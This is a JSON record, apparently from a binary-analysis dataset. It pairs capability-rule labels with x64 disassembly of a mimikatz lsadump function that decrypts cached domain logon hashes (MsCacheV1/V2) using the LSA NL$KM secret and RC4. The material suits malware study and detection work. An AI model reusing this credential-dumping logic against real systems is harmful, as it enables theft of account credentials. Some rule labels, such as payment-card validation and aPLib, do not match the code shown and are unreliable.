{
  "address": "0x1400a0dd8",
  "rules": [
    "contain loop",
    "hash data with CRC32/dc8063c9cb1c41b9a5bafe66f5117ac4",
    "connect to WMI namespace via WbemLocator/50f8c95bd151440fa4fe29260efaf440",
    "encrypt data using RC4 via SystemFunction032",
    "validate payment card number using luhn algorithm with no lookup table/f595b07566ee46b3ba7870816078c34e",
    "encrypt data using RC4 via SystemFunction033",
    "allocate or change RWX memory/e5d60c23edee4683a25ac882b99be25c/be08ffa5ddd942e8ab0706a663121e4b",
    "decompress data using aPLib/88da69e00a6e49ce8c080be3a0beeb89"
  ],
  "disassembly": [
    "mov     r11, rsp",
    "mov     qword [r11+0x8], rbx",
    "mov     qword [r11+0x10], rbp",
    "mov     qword [r11+0x18], rsi",
    "mov     qword [r11+0x20], r9",
    "push    rdi",
    "push    r12",
    "push    r13",
    "push    r14",
    "push    r15",
    "sub     rsp, 0x120",
    "lea     rax, [r11-0x38]",
    "mov     dword [rsp+0xb8], 0x10",
    "mov     dword [rsp+0xbc], 0x10",
    "mov     qword [r11-0x88], rax",
    "lea     rax, [r11-0x94]",
    "mov     rbx, r8",
    "mov     qword [rsp+0x30], rax",
    "lea     rax, [r11-0xb0]",
    "lea     r8, [rel data_14010e688]  {u\"Secrets\\NL$KM\\CurrVal\"}",
    "mov     qword [rsp+0x28], rax",
    "mov     rax, qword [rsp+0x170]",
    "mov     esi, 0x2800",
    "mov     rbp, r9",
    "mov     r15, rcx",
    "mov     dword [rsp+0x88], esi",
    "mov     qword [rsp+0x20], rax",
    "call    sub_1400a1af0",
    "test    eax, eax",
    "je      0x1400a1385",
    "lea     r11, [rsp+0x120]",
    "mov     eax, 0x1",
    "mov     rbx, qword [r11+0x30]",
    "mov     rbp, qword [r11+0x38]",
    "mov     rsi, qword [r11+0x40]",
    "mov     rsp, r11",
    "pop     r15",
    "pop     r14",
    "pop     r13",
    "pop     r12",
    "pop     rdi",
    "retn    ",
    "mov     rdi, qword [rsp+0x178]",
    "test    rdi, rdi",
    "je      0x1400a0e87",
    "xor     ecx, ecx",
    "mov     rax, qword [rdi]",
    "neg     rax",
    "sbb     ecx, ecx",
    "and     ecx, 0x20006",
    "jmp     0x1400a0e89",
    "mov     rcx, qword [rsp+0x98]",
    "call    qword [rel LocalFree]",
    "test    rbp, rbp",
    "je      0x1400a0f57",
    "or      ecx, 0x20019",
    "lea     rax, [rsp+0x80]",
    "lea     r8, [rel data_14010e6b8]  {u\"Cache\"}",
    "mov     qword [rsp+0x28], rax",
    "mov     dword [rsp+0x20], ecx",
    "xor     r9d, r9d",
    "mov     rcx, r15",
    "mov     rdx, rbx",
    "call    sub_14000e7cc",
    "test    eax, eax",
    "je      0x1400a1377",
    "and     qword [rsp+0x60], 0x0",
    "and     qword [rsp+0x58], 0x0",
    "mov     rdx, qword [rsp+0x80]",
    "lea     rax, [rsp+0x8c]",
    "xor     r9d, r9d",
    "xor     r8d, r8d",
    "mov     qword [rsp+0x50], rax",
    "lea     rax, [rsp+0x78]",
    "mov     rcx, r15",
    "mov     qword [rsp+0x48], rax",
    "lea     rax, [rsp+0x90]",
    "mov     qword [rsp+0x40], rax",
    "and     qword [rsp+0x38], 0x0",
    "and     qword [rsp+0x30], 0x0",
    "and     qword [rsp+0x28], 0x0",
    "and     qword [rsp+0x20], 0x0",
    "call    sub_14000ea60",
    "test    eax, eax",
    "je      0x1400a1367",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "mov     rdx, qword [rsp+0x80]",
    "lea     r11, [rsp+0xd8]",
    "mov     qword [rsp+0x30], r11",
    "lea     rax, [rsp+0x70]",
    "lea     r8, [rel data_14010e6c8]  {u\"NL$IterationCount\"}",
    "mov     qword [rsp+0x28], rax",
    "and     qword [rsp+0x20], 0x0",
    "xor     r9d, r9d",
    "mov     rcx, r15",
    "call    sub_14000ed54",
    "test    eax, eax",
    "je      0x1400a0f4b",
    "mov     rdx, qword [rsp+0x80]",
    "mov     rcx, r15",
    "call    sub_14000f310",
    "mov     eax, dword [rsp+0x78]",
    "mov     ebx, 0x40",
    "inc     eax",
    "mov     ecx, ebx",
    "lea     edx, [rax+0x1]",
    "mov     dword [rsp+0x78], eax",
    "add     rdx, rdx",
    "call    qword [rel LocalAlloc]",
    "mov     r12, rax",
    "test    rax, rax",
    "je      0x1400a1367",
    "lea     rcx, [rel data_14010e780]  {u\"* Iteration is set to default (1\u2026\"}",
    "mov     edx, dword [rsp+0x70]",
    "mov     ecx, edx",
    "mov     eax, edx",
    "and     ecx, 0xfffffc00",
    "shl     eax, 0xa",
    "cmp     edx, esi",
    "cmova   eax, ecx",
    "lea     rcx, [rel data_14010e6f0]  {u\"* NL$IterationCount is %u, %u re\u2026\"}",
    "mov     r8d, eax",
    "mov     esi, eax",
    "mov     dword [rsp+0x88], eax",
    "call    sub_14000c030",
    "cmp     dword [rsp+0x70], 0x0",
    "jne     0x1400a0f57",
    "mov     edx, dword [rsp+0x8c]",
    "mov     ecx, ebx",
    "call    qword [rel LocalAlloc]",
    "mov     rbx, rax",
    "test    rax, rax",
    "je      0x1400a135e",
    "lea     rcx, [rel data_14010e758]  {u\"* DCC1 mode !\\n\"}",
    "jmp     0x1400a0f52",
    "mov     rcx, r12",
    "call    qword [rel LocalFree]",
    "xor     ecx, ecx",
    "mov     dword [rsp+0x70], ecx",
    "cmp     dword [rsp+0x90], ecx",
    "jbe     0x1400a1355",
    "call    sub_14000c030",
    "mov     rcx, rbx",
    "call    qword [rel LocalFree]",
    "mov     eax, dword [rsp+0x78]",
    "mov     rdx, qword [rsp+0x80]",
    "mov     r8d, ecx",
    "mov     dword [rsp+0xb0], eax",
    "mov     eax, dword [rsp+0x8c]",
    "mov     r9, r12",
    "mov     dword [rsp+0x74], eax",
    "lea     rax, [rsp+0x74]",
    "mov     rcx, r15",
    "mov     qword [rsp+0x40], rax",
    "mov     qword [rsp+0x38], rbx",
    "lea     rax, [rsp+0x94]",
    "mov     qword [rsp+0x30], rax",
    "and     qword [rsp+0x28], 0x0",
    "lea     rax, [rsp+0xb0]",
    "mov     qword [rsp+0x20], rax",
    "call    sub_14000f0c8",
    "test    eax, eax",
    "je      0x1400a1337",
    "mov     ecx, dword [rsp+0x70]",
    "mov     esi, dword [rsp+0x88]",
    "inc     ecx",
    "mov     dword [rsp+0x70], ecx",
    "cmp     ecx, dword [rsp+0x90]",
    "jb      0x1400a1014",
    "lea     rdx, [rel data_14010e7d0]  {u\"NL$Control\"}",
    "mov     r8d, 0xa",
    "mov     rcx, r12",
    "call    qword [rel _wcsnicmp]",
    "test    eax, eax",
    "je      0x1400a1337",
    "lea     rdx, [rel data_14010e6c8]  {u\"NL$IterationCount\"}",
    "mov     r8d, 0x11",
    "mov     rcx, r12",
    "call    qword [rel _wcsnicmp]",
    "test    eax, eax",
    "je      0x1400a1337",
    "test    byte [rbx+0x30], 0x1",
    "je      0x1400a1337",
    "lea     rcx, [rel data_14010e7e8]  {u\"\\n[%s - \"}",
    "mov     rdx, r12",
    "call    sub_14000c030",
    "lea     rcx, [rbx+0x20]",
    "call    sub_1400130c0",
    "mov     edx, dword [rbx+0x10]",
    "lea     rcx, [rel data_14010e7f8]  {u\"]\\nRID       : %08x (%u)\\n\"}",
    "mov     r8d, edx",
    "call    sub_14000c030",
    "mov     r11d, dword [rsp+0x74]",
    "lea     r14d, [r11-0x60]",
    "test    rbp, rbp",
    "je      0x1400a13d3",
    "mov     rax, qword [rsp+0xc0]",
    "mov     r8d, dword [rsp+0xb4]",
    "mov     rdx, qword [rsp+0x98]",
    "mov     dword [rsp+0x30], 0x10",
    "mov     qword [rsp+0x28], rax",
    "lea     r9, [rbx+0x40]",
    "mov     ecx, 0x8003",
    "mov     dword [rsp+0x20], 0x10",
    "call    sub_140003e0c",
    "test    eax, eax",
    "je      0x1400a1610",
    "and     dword [rsp+0x30], 0x0",
    "mov     r9, qword [rsp+0x98]",
    "lea     r13, [rbx+0x40]",
    "lea     rdx, [rbx+0x60]",
    "mov     r8d, r14d",
    "mov     ecx, 0x660e",
    "mov     qword [rsp+0x28], r13",
    "mov     dword [rsp+0x20], 0x10",
    "call    sub_140004618",
    "test    eax, eax",
    "je      0x1400a132f",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_14010eb70]  {u\"ERROR kuhl_m_lsadump_getNLKMSecr\u2026\"}",
    "jmp     0x1400a1604",
    "lea     rsi, [rbx+0x60]",
    "lea     rdx, [rsp+0xb8]",
    "lea     rcx, [rsp+0xc8]",
    "mov     dword [rsp+0xcc], r14d",
    "mov     dword [rsp+0xc8], r14d",
    "mov     qword [rsp+0xd0], rsi",
    "call    SystemFunction033",
    "test    eax, eax",
    "js      0x1400a15fd",
    "mov     rbp, qword [rsp+0x168]",
    "mov     dl, 0x32",
    "mov     rcx, rbx",
    "call    sub_1400a1620",
    "movzx   r11d, word [rbx]",
    "mov     r8, qword [rdi+0x30]",
    "lea     rax, [rbx+0xa8]",
    "mov     word [rsp+0xa2], r11w",
    "mov     word [rsp+0xa0], r11w",
    "mov     qword [rsp+0xa8], rax",
    "test    r8, r8",
    "je      0x1400a1196",
    "mov     edx, eax",
    "call    sub_14000c030",
    "jmp     0x1400a1337",
    "lea     rcx, [rel data_14010ead0]  {u\"ERROR kuhl_m_lsadump_getNLKMSecr\u2026\"}",
    "mov     dl, 0x31",
    "mov     rcx, rbx",
    "call    sub_1400a1620",
    "movzx   r11d, word [rbx]",
    "lea     rdx, [rbx+0xa8]",
    "mov     word [rsp+0xa2], r11w",
    "mov     word [rsp+0xa0], r11w",
    "mov     qword [rsp+0xa8], rdx",
    "test    rdi, rdi",
    "je      0x1400a1337",
    "mov     rcx, qword [rdi]",
    "test    rcx, rcx",
    "je      0x1400a132f",
    "mov     edx, dword [rbx+0x84]",
    "test    edx, edx",
    "je      0x1400a1196",
    "mov     rcx, qword [rdi]",
    "test    rcx, rcx",
    "je      0x1400a1337",
    "movzx   r8d, r11w",
    "mov     rdx, rax",
    "shr     r8, 0x1",
    "call    qword [rel _wcsnicmp]",
    "test    eax, eax",
    "jne     0x1400a132f",
    "mov     r9d, dword [rdi+0x38]",
    "mov     eax, r14d",
    "sub     eax, edx",
    "lea     rcx, [rax+rbx+0x60]",
    "call    sub_1400a16dc",
    "mov     rax, qword [rsp+0xa8]",
    "mov     r11w, word [rsp+0xa0]",
    "movzx   r8d, r11w",
    "shr     r8, 0x1",
    "call    qword [rel _wcsnicmp]",
    "test    eax, eax",
    "jne     0x1400a1337",
    "lea     rcx, [rel data_14010e830]  {u\"> User cache replace mode (2)!\\n\"}",
    "call    sub_14000c030",
    "cmp     dword [rdi+0x18], 0x0",
    "je      0x1400a1218",
    "lea     rcx, [rel data_14010e9e0]  {u\"> User cache replace mode (1)!\\n\"}",
    "call    sub_14000c030",
    "cmp     dword [rdi+0x18], 0x0",
    "je      0x1400a14f7",
    "cmp     dword [rdi+0x2c], 0x0",
    "je      0x1400a122a",
    "lea     rdx, [rsp+0xa0]",
    "lea     rcx, [rsp+0x100]",
    "mov     r8b, 0x1",
    "call    RtlDowncaseUnicodeString",
    "mov     r11d, eax",
    "test    eax, eax",
    "js      0x1400a120e",
    "cmp     dword [rdi+0x2c], 0x0",
    "je      0x1400a1506",
    "lea     rdx, [rsp+0xa0]",
    "lea     rcx, [rsp+0xe0]",
    "mov     r8b, 0x1",
    "call    RtlDowncaseUnicodeString",
    "test    eax, eax",
    "js      0x1400a1506",
    "xor     eax, eax",
    "movdqu  xmm0, xmmword [rdi+0x1c]",
    "movdqu  xmmword [rbx+0x60], xmm0",
    "jmp     0x1400a1234",
    "xor     eax, eax",
    "test    r11d, r11d",
    "setns   al",
    "jmp     0x1400a122c",
    "lea     rax, [rsp+0x100]",
    "lea     rdx, [rdi+0x8]",
    "lea     rcx, [rbx+0x60]",
    "mov     r9d, r11d",
    "mov     r8d, esi",
    "mov     qword [rsp+0x20], rax",
    "call    sub_140004b88",
    "mov     r11d, eax",
    "lea     rdx, [rsp+0xa0]",
    "lea     rcx, [rsp+0xf0]",
    "mov     r8b, 0x1",
    "call    RtlDowncaseUnicodeString",
    "test    eax, eax",
    "js      0x1400a1337",
    "movdqu  xmm0, xmmword [rdi+0x1c]",
    "movdqu  xmmword [rsi], xmm0",
    "lea     rcx, [rsp+0xe0]",
    "lea     rdx, [rdi+0x8]",
    "mov     r9d, eax",
    "mov     qword [rsp+0x20], rcx",
    "mov     rcx, rsi",
    "xor     r8d, r8d",
    "call    sub_140004b88",
    "jmp     0x1400a1506",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_14010e960]  {u\"ERROR kuhl_m_lsadump_getNLKMSecr\u2026\"}",
    "jmp     0x1400a13b8",
    "lea     rcx, [rel data_14010e870]  {u\"  MsCacheV2 : \"}",
    "call    sub_14000c030",
    "xor     r8d, r8d",
    "lea     rcx, [rbx+0x60]",
    "lea     edx, [r8+0x10]",
    "call    sub_140012f68",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "mov     rdx, qword [rsp+0x98]",
    "mov     eax, 0x10",
    "mov     dword [rsp+0x30], eax",
    "lea     rsi, [rbx+0x50]",
    "lea     r9, [rbx+0x60]",
    "mov     r8d, eax",
    "mov     ecx, 0x8004",
    "mov     qword [rsp+0x28], rsi",
    "mov     dword [rsp+0x20], r14d",
    "call    sub_140003e0c",
    "test    eax, eax",
    "je      0x1400a132f",
    "test    eax, eax",
    "je      0x1400a13c4",
    "lea     rcx, [rsp+0xf0]",
    "lea     rdx, [rdi+0x8]",
    "mov     r9d, eax",
    "mov     qword [rsp+0x20], rcx",
    "mov     rcx, rsi",
    "xor     r8d, r8d",
    "call    sub_140004b88",
    "test    eax, eax",
    "js      0x1400a1337",
    "mov     edx, eax",
    "call    sub_14000c030",
    "jmp     0x1400a132f",
    "lea     rcx, [rel data_14010e890]  {u\"  Checksum  : \"}",
    "call    sub_14000c030",
    "xor     r8d, r8d",
    "mov     rcx, rsi",
    "lea     edx, [r8+0x10]",
    "call    sub_140012f68",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "mov     r9, qword [rsp+0x98]",
    "mov     dword [rsp+0x30], 0x1",
    "lea     rdx, [rbx+0x60]",
    "mov     r8d, r14d",
    "mov     ecx, 0x660e",
    "mov     qword [rsp+0x28], r13",
    "mov     dword [rsp+0x20], 0x10",
    "call    sub_140004618",
    "test    eax, eax",
    "je      0x1400a132f",
    "lea     rcx, [rel data_14010ea20]  {u\"  MsCacheV1 : \"}",
    "call    sub_14000c030",
    "xor     r8d, r8d",
    "mov     rcx, rsi",
    "lea     edx, [r8+0x10]",
    "call    sub_140012f68",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "mov     rdx, qword [rsp+0xc0]",
    "mov     dword [rsp+0x30], 0x10",
    "lea     rbp, [rbx+0x50]",
    "mov     r9, rsi",
    "mov     r8d, 0x10",
    "mov     ecx, 0x8003",
    "mov     qword [rsp+0x28], rbp",
    "mov     dword [rsp+0x20], r14d",
    "call    sub_140003e0c",
    "test    eax, eax",
    "je      0x1400a132f",
    "mov     eax, dword [rsp+0x74]",
    "mov     rdx, qword [rsp+0x80]",
    "xor     r9d, r9d",
    "mov     dword [rsp+0x30], eax",
    "mov     eax, dword [rsp+0x94]",
    "mov     r8, r12",
    "mov     rcx, r15",
    "mov     qword [rsp+0x28], rbx",
    "mov     dword [rsp+0x20], eax",
    "call    sub_14000ee50",
    "test    eax, eax",
    "je      0x1400a13ab",
    "lea     rcx, [rel data_14010e890]  {u\"  Checksum  : \"}",
    "call    sub_14000c030",
    "xor     r8d, r8d",
    "mov     rcx, rbp",
    "lea     edx, [r8+0x10]",
    "call    sub_140012f68",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "lea     rdx, [rsp+0xb8]",
    "lea     rcx, [rsp+0xc8]",
    "call    SystemFunction032",
    "test    eax, eax",
    "jns     0x1400a12ed",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_14010e8b0]  {u\"ERROR kuhl_m_lsadump_getNLKMSecr\u2026\"}",
    "lea     rcx, [rel data_14010c500]  {u\"> OK!\\n\"}",
    "call    sub_14000c030",
    "lea     rcx, [rel data_14010ea40]  {u\"ERROR kuhl_m_lsadump_getNLKMSecr\u2026\"}",
    "jmp     0x1400a13b8"
  ],
  "high_level_IL": [
    "No High Level IL Loaded"
  ]
}